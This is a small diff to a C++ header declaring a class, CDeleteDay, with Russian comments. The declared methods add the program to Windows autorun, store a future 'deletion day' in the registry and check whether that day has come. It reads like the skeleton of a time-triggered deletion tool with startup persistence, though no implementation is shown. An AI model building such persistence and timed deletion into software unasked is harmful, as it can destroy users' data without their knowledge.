@@ -1,14 +1,18 @@
 #pragma once
 class CDeleteDay
 {
+private:
+	CString m_strFilePath; //путь к нашему экзешнику
+	//установить в конструкторе
+
 public:
 	CDeleteDay();
 	~CDeleteDay();
 
 	// //добавляем себя автозагрузку
-	static bool AddToAutoRun();
+	bool AddToAutoRun();
 	// Проверить не наступил ли день выполнения задания
-	static bool InspectDeleteData();
+	bool InspectDeleteData();
 
 	// записываем в реестр когда выполнится задача
 	bool SaveDeleteDay(SYSTEMTIME SysTime);
